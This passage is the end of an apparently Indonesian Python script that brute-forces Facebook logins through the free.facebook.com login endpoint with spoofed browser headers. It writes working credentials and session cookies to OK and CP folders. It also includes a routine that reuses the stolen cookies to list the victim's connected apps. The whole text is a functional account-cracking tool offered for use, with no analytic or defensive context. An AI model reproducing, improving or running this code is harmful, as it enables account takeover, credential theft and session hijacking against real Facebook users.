inly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ffdcfdd82afbb14%26relation%3Dopener%26frame%3Dfe20773f2a208%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?api_key=546387748750105&auth_token=0865cd751de538e8ceda4e2bfa424149&skip_api_login=1&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D546387748750105%26auth_type%3Drerequest%26cbt%3D1688382770423%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1829a399f40574%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ffdcfdd82afbb14%2526relation%253Dopener%26client_id%3D546387748750105%26display%3Dtouch%26domain%3Dbrainly.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbrainly.co.id%252Fsignup%253Fentry%253D1%2526source%253Dunlogged%252Bhomepage%252Bheader%252Bbutton%26locale%3Den_US%26logger_id%3Df284b987fabd2fc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df206a023ebbf0d%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ffdcfdd82afbb14%2526relation%253Dopener%2526frame%253Dfe20773f2a208%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv3.2%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=546387748750105&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df206a023ebbf0d%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ffdcfdd82afbb14%26relation%3Dopener%26frame%3Dfe20773f2a208%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				raf = f'[italic white]•••> [italic yellow2]{idf}|{pw}\n[dim white]{usus}\n'
				cetak(raf) 
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				raf = f'[italic white]•••> [italic green]{idf}|{pw}\n[dim green2]{coki}\n'
				cetak(raf) 
				open('OK/'+okh,'a').write(idf+'|'+pw+'\n')
			#	cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#-----------------------[ METODE ALPHA ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('RAF_MKZ') 
	except:pass
	login() 
